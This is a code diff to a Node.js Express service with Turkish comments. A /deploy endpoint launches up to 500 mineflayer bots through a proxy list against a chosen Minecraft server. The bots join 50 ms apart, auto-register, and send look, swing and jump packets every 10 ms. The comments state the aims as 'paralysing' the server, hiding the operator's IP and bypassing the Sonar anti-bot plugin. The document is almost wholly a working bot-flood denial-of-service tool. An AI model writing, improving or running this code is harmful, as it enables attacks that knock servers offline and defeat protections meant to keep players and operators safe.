@@ -5,11 +5,10 @@ const app = express();
 app.use(express.json());
 app.use(require('cors')());
 
-// 🛡️ VIP PROXY LİSTESİ (Gerçek IP Gizliliği)
+// 🛡️ BU LİSTE ÇOK ÖNEMLİ (En az 50-100 tane çalışan Proxy ekle!)
 const proxyList = [
     "socks5://ip:port",
     "http://ip:port"
-    // Burayı doldurmayı unutma kanka!
 ];
 
 let activeBots = [];
@@ -19,9 +18,11 @@ app.post('/deploy', (req, res) => {
     const host = ip.includes(':') ? ip.split(':')[0] : ip;
     const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;
 
-    console.log(`[VIP ELITE] Hedef: ${host} | Paket Kapasitesi: 50.000`);
+    console.log(`[!!! PARTY MODE ACTIVE !!!] 129GB RAM DEVREDE.`);
+    console.log(`Hedef: ${host} | Bot Sayısı: ${count}`);
 
     for (let i = 0; i < Math.min(count, 500); i++) {
+        // GECİKMEYİ 50ms'YE DÜŞÜRDÜK (Aynı anda girmeleri için)
         setTimeout(() => {
             const currentProxy = proxyList[i % proxyList.length];
             if (!currentProxy) return;
@@ -31,45 +32,36 @@ app.post('/deploy', (req, res) => {
             const bot = mineflayer.createBot({
                 host: host,
                 port: port,
-                username: `Trgr_Vip_${Math.floor(Math.random() * 90000) + 10000}`,
+                username: `VipParty_${Math.floor(Math.random() * 999999)}`,
                 version: false,
-                agent: agent,
-                hideErrors: true
+                agent: agent, // IP Gizleme
+                hideErrors: true,
+                skipValidation: true // Girişi hızlandırır
             });
 
-            // 🛡️ SONAR / ANTI-CHEAT BYPASS
             bot.on('spawn', () => {
-                console.log(`[+] ${bot.username} Sızdı.`);
+                console.log(`[🚀] ${bot.username} İÇERİ DALDI!`);
                 
-                // 1. GİRİŞ VE KAYIT SİSTEMİ
-                setTimeout(() => {
-                    // Sunucu mesajlarını dinleyip /login mi /register mı gerektiğini anlar
-                    bot.chat(`/register resul3163 resul3163`);
-                    bot.chat(`/login resul3163`);
-                }, 2000);
+                // GİRER GİRMEZ KAYIT OL
+                bot.chat(`/register resul3163 resul3163`);
+                bot.chat(`/login resul3163`);
 
-                // 2. 50.000 PAKET STRESS TESTİ (CPU Yorma)
-                // Sonar gibi eklentilerin hareket hızından banlamaması için 
-                // paketleri "Position" değil, "HeadLook" ve "Swing" üzerinden yollarız.
-                let packetCount = 0;
-                const stressInterval = setInterval(() => {
-                    if (packetCount >= 50000 || !bot.entity) {
-                        clearInterval(stressInterval);
-                        return;
+                // SUNUCUYU FELÇ ETME PAKETLERİ (Saniyede 100 paket!)
+                setInterval(() => {
+                    if(bot.entity) {
+                        bot.look(Math.random() * 360, Math.random() * 180);
+                        bot.swingArm('right');
+                        bot.setControlState('jump', true);
+                        // Paket yağmuru ile sunucuyu meşgul et
                     }
-                    
-                    // Sunucuyu meşgul eden sessiz paketler
-                    bot.look(Math.random() * 360, Math.random() * 90);
-                    bot.swingArm('right');
-                    packetCount += 2; // Her döngüde 2 paket
-                }, 10); // Milisaniyelik saldırı
+                }, 10); 
             });
 
             bot.on('error', (err) => console.log(`[!] Hata: ${err.message}`));
             activeBots.push(bot);
-        }, i * 2000); // 2 saniye kuralı (Sonar Bypass)
+        }, i * 50); // Sadece 0.05 saniye arayla (Neredeyse aynı anda!)
     }
-    res.json({ success: true, message: "50.000 Paket Kapasiteli Ordu Sevk Edildi!" });
+    res.json({ success: true, message: "PARTİ BAŞLADI! Yüzlerce bot sızıyor!" });
 });
 
 app.listen(process.env.PORT || 3000);
